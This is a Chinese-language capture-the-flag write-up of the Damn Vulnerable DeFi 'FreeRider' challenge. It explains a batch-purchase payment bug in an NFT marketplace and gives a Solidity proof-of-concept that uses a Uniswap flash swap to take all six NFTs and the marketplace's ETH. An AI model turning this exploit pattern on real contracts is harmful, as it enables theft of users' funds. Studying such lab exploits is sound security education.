# FreeRider

## 题目介绍



> **一个该死的有价值的NFT的新市场已经发布！市场上有6个NFT的初始铸币厂，这些NFT正在出售。每个在15 ETH。**
>
> **报告了一个严重的漏洞，声称所有代币都可以被拿走。然而，开发人员不知道如何拯救他们！**
>
> **他们向任何愿意将NFTs拿出来并以自己的方式发送的人提供45 ETH的赏金。恢复过程由专用的智能合约管理。**
>
> **你已经同意帮忙了。尽管，你的余额只有0.1 ETH。开发人员只是不会回复你要求更多的信息。**
>
> **如果你能获得免费的ETH就好了，至少一瞬间。**

## 合约分析

合约主要是由一个nft市场还有一个恢复管理合约组成，挑战成功的条件是交易所丢失所有的eth和nft，nft都要转到恢复地址。

玩家拥有45 eth的奖金。仔细一看挑战合约的初始化有uniswap的池子和我们的题目一结合就有点意思了。下面是购买的函数

我们发现倒数第二行有问题，他直接把钱给了买家。并且只检查支付一次的钱。相当于我们只需要用 15 eth可以循环购买，并且我们还可以得到池子里面的90 eth 和所有的nft。

``` solidity
    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```



## 解题过程

1.利用uniswap闪电贷借款15 eth。

2.购买6个nft调用buymany函数。

3.把钱还给池子加上0.3%手续费。

4.把nft发送到recoveryManager，abi编码攻击者的地址。

**POC**

``````solidity
contract Exploit is Test{


    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    address public owner;

    constructor(DamnValuableToken _token,FreeRiderNFTMarketplace _marketplace,DamnValuableNFT _nft,FreeRiderRecoveryManager _recovery,WETH _weth,IUniswapV2Pair _pair)payable {
        token=_token;
        marketplace=_marketplace;
        nft=_nft;
        recoveryManager=_recovery;
        weth=_weth;
        uniswapPair=_pair;
        owner=msg.sender;
    }
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        weth.withdraw(weth.balanceOf(address(this)));
        //购买nft
        uint256[] memory nftid = new uint256[](6);
        for (uint i = 0; i < nftid.length; ++i) {
            nftid[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(nftid);
        //手续费
        uint256 replayamount =15 ether * 1004 / 1000;
        weth.deposit{value: replayamount}();
        weth.transfer(address(uniswapPair), 15.06 ether);
        weth.transfer(address(owner), weth.balanceOf(address(this)));

        //转到恢复地址
        for(uint256 i=0;i<6;i++){
            nft.safeTransferFrom(address(this), address(recoveryManager), i,abi.encode(address(owner)));
        }

    }
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    receive() external payable{}
}

``````